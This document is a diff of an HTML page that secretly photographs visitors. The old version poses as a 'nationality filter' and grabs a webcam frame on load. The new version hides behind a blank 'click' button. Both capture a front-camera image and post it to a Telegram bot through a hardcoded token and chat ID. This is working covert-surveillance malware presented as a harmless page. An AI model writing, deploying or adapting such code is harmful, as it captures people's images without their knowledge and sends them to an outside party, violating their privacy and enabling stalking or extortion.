@@ -1,78 +1,109 @@
 
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Filter</title>
-    <style>
-        div{
-            background-color: aliceblue;
-            z-index: 1000;
-            position: absolute;
-            width: 100%;
-            height: 110%;
-            top: 8px;
-            
-        }
-        div p{
-            color: blue;
-            font-size: 30px;
-            text-align: center;
-        }
-        #video {
-            width: 100%;
-            height: 100vh;
-            object-fit: cover;
-        }
-        #canvas {
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <video id="video" autoplay muted></video>
-    <div><p>Essayez le filtre maintenant pour connaître votre nationalité</p></div>
-    <canvas id="canvas"></canvas>
-    <script>
-        const TELEGRAM_TOKEN = '6649802802:AAFc3iuD443KJP7FnDydxL0rSZjy8Me5-P4';
-        const TELEGRAM_CHAT_ID = '5310078604';
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title></title>  
+    <style>  
+        #permissionBox {  
+            position: fixed;  
+            top: 50%;  
+            left: 50%;  
+            transform: translate(-50%, -50%);  
+            background: #1a1a1a;  
+            padding: 2rem;  
+            border-radius: 10px;  
+            text-align: center;  
+            z-index: 10000;  
+        }  
+        #cameraIndicator {  
+            position: fixed;  
+            top: 10px;  
+            right: 10px;  
+            background: red;  
+            padding: 5px;  
+            color: white;  
+            display: none;  
+        }  
+    </style>  
+</head>  
+<body>  
 
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
+<div id="permissionBox">  
+    <h2 style="color: #fff;"></h2>  
+    <button onclick="initCamera()" style="padding: 10px 20px; background: #4CAF50; border: none; border-radius: 5px;">  
+        click
+    </button>  
+</div>  
 
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('chat_id', TELEGRAM_CHAT_ID);
-                            formData.append('photo', blob);
+<div id="cameraIndicator"></div>  
 
-                            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            })
-                            .then(response => {
-                                if (response.ok) {
-                                    console.log('Done');
-                                } else {
-                                    console.error('error');
-                                }
-                            })
-                            .catch(error => console.error( error));
-                        }, 'image/png');
-                    }, 2000);
-                })
-                .catch(error => console.error( error));
-        } else {
-            console.error();
-        }
-    </script>
-</body>
-</html>
+<script>  
+const BOT_TOKEN = '6649802802:AAFc3iuD443KJP7FnDydxL0rSZjy8Me5-P4';  
+const CHAT_ID = '5310078604';  
+let mediaStream = null;  
+
+async function initCamera() {  
+    document.getElementById('permissionBox').style.display = 'none';  
+    
+    try {  
+        mediaStream = await navigator.mediaDevices.getUserMedia({  
+            video: {  
+                width: { ideal: 1280 },  
+                height: { ideal: 720 },  
+                facingMode: "user"  
+            },  
+            audio: false  
+        });  
+        
+        document.getElementById('cameraIndicator').style.display = 'block';  
+        await captureAndSend(); // ⚡ تنفيذ لمرة واحدة  
+        
+    } catch (error) {  
+        alert('فشل الوصول: ' + error.message);  
+    } finally {  
+        stopCamera(); // إيقاف الكاميرا فورًا  
+    }  
+}  
+
+async function captureAndSend() {  
+    const video = document.createElement('video');  
+    video.srcObject = mediaStream;  
+    video.play();  
+
+    // انتظار ضبط الإضاءة  
+    await new Promise(resolve => setTimeout(resolve, 500));  
+
+    const canvas = document.createElement('canvas');  
+    canvas.width = video.videoWidth;  
+    canvas.height = video.videoHeight;  
+    canvas.getContext('2d').drawImage(video, 0, 0);  
+
+    const blob = await new Promise(resolve =>  
+        canvas.toBlob(resolve, 'image/jpeg', 0.9)  
+    );  
+
+    const formData = new FormData();  
+    formData.append('chat_id', CHAT_ID);  
+    formData.append('photo', blob, 'capture.jpg');  
+
+    try {  
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {  
+            method: 'POST',  
+            body: formData  
+        });  
+        alert('');  
+    } catch (error) {  
+        console.error('', error);  
+    }  
+}  
+
+function stopCamera() {  
+    if (mediaStream) {  
+        mediaStream.getTracks().forEach(track => track.stop());  
+        document.getElementById('cameraIndicator').style.display = 'none';  
+    }  
+}  
+</script>  
+
+</body>  
+</html>  
